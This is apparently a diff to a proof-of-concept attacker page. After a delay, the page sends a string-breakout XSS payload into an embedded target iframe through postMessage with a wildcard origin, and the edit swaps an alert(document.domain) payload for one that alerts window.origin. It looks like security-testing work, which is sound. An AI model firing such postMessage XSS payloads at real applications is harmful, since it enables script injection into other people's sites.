@@ -7,10 +7,13 @@
     <script>
         // Wait for the iframe to load, then fire the payload
         setTimeout(function() {
-            var target = document.getElementById('targetApp').contentWindow;
-            // The '*' allows the message to be sent regardless of target origin
-            target.postMessage(''-alert(document.domain)-'', '*');
-            console.log("Payload fired!");
+          var targetFrame = document.getElementById('targetApp').contentWindow;
+            
+            // Hardcoded diagnostic payload. If this pops, it will literally tell you where it executed.
+            var payload = "'-alert(\"Execution Context: \" + window.origin)-'";
+            
+            console.log("Sending payload to iframe...");
+            targetFrame.postMessage(payload, '*');
         }, 25000);
     </script>
 </body>
